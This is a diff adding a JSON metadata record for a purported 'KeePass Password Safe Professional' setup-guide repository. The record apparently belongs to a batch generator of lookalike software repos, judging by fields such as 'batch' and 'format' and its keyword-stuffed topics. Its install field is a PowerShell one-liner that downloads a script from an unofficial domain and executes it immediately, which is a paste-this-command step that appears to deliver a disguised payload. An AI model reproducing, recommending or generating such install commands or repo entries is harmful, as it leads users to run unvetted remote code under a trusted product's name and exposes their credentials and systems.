@@ -1,0 +1,25 @@
+{
+  "repo": "KeePass-Password-Safe-Professional-Complete-Setup-Guide",
+  "product": "KeePass Password Safe Professional Complete Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "security",
+  "topics": [
+    "keepass-password-safe-professional-compl",
+    "keepass",
+    "password",
+    "safe",
+    "professional",
+    "complete",
+    "setup",
+    "security",
+    "windows",
+    "desktop",
+    "setup-guide",
+    "software"
+  ]
+}
